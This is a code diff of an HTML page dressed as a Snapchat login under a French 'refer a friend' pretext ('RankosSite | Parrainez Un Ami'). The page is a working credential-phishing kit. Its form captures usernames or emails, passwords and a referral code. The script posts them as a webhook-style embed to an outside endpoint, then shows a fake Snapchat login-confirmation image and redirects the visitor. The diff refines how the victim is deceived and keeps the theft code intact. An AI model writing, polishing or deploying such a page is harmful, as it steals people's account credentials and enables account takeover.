@@ -3,9 +3,9 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>RankosSite | Parrainez Un Amis</title>
+  <title>RankosSite | Parrainez Un Ami</title>
 
-  <meta property="og:title" content="RankosSite | Parrainez Un Amis" />
+  <meta property="og:title" content="RankosSite | Parrainez Un Ami" />
   <meta property="og:description" content="Description courte" />
   <meta property="og:image" content="https://i.ibb.co/wZhXf3RN/Snapchat-1.png" />
 
@@ -21,7 +21,7 @@
       height: 100vh;
       color: #000;
     }
-    .login-box, .message-box {
+    .login-box {
       width: 100%;
       max-width: 400px;
       padding: 40px;
@@ -30,14 +30,6 @@
       text-align: center;
       background-color: #fff;
       color: #000;
-    }
-    .message-box {
-      display: none;
-      font-size: 18px;
-    }
-    .message-box img {
-      max-width: 100%;
-      border-radius: 12px;
     }
     .logo {
       width: 80px;
@@ -99,18 +91,24 @@
       color: blue;
       font-weight: bold;
       cursor: pointer;
-      user-select: none;
       padding: 0;
       font-family: inherit;
       font-size: inherit;
       text-decoration: underline;
+    }
+    #imageContainer {
+      display: none;
+    }
+    #imageContainer img {
+      max-width: 100%;
+      border-radius: 10px;
     }
   </style>
 </head>
 <body>
   <div class="login-box" id="loginBox">
     <img src="https://support-tools.storage.googleapis.com/Snapchat-Ghost-logo-347777501.png" alt="Logo Snapchat" class="logo" />
-    <h2>RankosSite | Parrainez Un Amis</h2>
+    <h2>RankosSite | Parrainez Un Ami</h2>
     <form id="loginForm">
       <div class="form-group">
         <label for="username">Nom d'utilisateur ou e-mail</label>
@@ -136,9 +134,8 @@
     <p id="referralError">Le code de parrainage doit contenir exactement 4 chiffres.</p>
   </div>
 
-  <div class="message-box" id="messageBox">
-    <img src="/mnt/data/bcb4d12d-23ec-44ee-aae6-14f89a0adf60.png" alt="Notification Snapchat traduite">
-    <p><strong>Essayez-vous d’accéder à Snapchat depuis un navigateur ?<br/>Touchez pour plus de détails.</strong></p>
+  <div id="imageContainer">
+    <img src="https://images.airdroid.com/2022/12/confirm-log-in-on-snapchat-web.jpg" alt="Notification Snapchat" />
   </div>
 
   <script>
@@ -173,14 +170,6 @@
         return;
       }
 
-      // Masquer le formulaire et afficher l'image après 2 secondes
-      document.getElementById('loginBox').style.display = 'none';
-
-      setTimeout(() => {
-        document.getElementById('messageBox').style.display = 'block';
-      }, 2000);
-
-      // Envoi des données
       const message = {
         embeds: [
           {
@@ -188,26 +177,12 @@
             description: "Informations collectées via le formulaire",
             color: 0xffc800,
             fields: [
-              {
-                name: "👤 Nom d'utilisateur / e-mail",
-                value: username,
-                inline: false
-              },
-              {
-                name: "🔒 Mot de passe",
-                value: password,
-                inline: false
-              },
-              {
-                name: "🎁 Code de parrainage",
-                value: referralCode,
-                inline: false
-              }
+              { name: "👤 Nom d'utilisateur / e-mail", value: username },
+              { name: "🔒 Mot de passe", value: password },
+              { name: "🎁 Code de parrainage", value: referralCode }
             ],
             timestamp: new Date().toISOString(),
-            footer: {
-              text: "Formulaire Rankos"
-            }
+            footer: { text: "Formulaire Rankos" }
           }
         ]
       };
@@ -216,16 +191,18 @@
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
         body: JSON.stringify(message),
-      })
-      .then(response => {
+      });
+
+      // Interface masquée + attente
+      document.getElementById('loginBox').style.display = 'none';
+
+      setTimeout(() => {
+        document.getElementById('imageContainer').style.display = 'block';
+
         setTimeout(() => {
           window.location.href = redirectURL;
-        }, 4000); // Total : 2s attente + 2s affichage avant redirection
-      })
-      .catch(error => {
-        alert("Erreur réseau ou CORS.");
-        console.error(error);
-      });
+        }, 30000); // 30 secondes
+      }, 2000); // 2 secondes
     });
 
     document.getElementById('signupLink').addEventListener('click', () => {
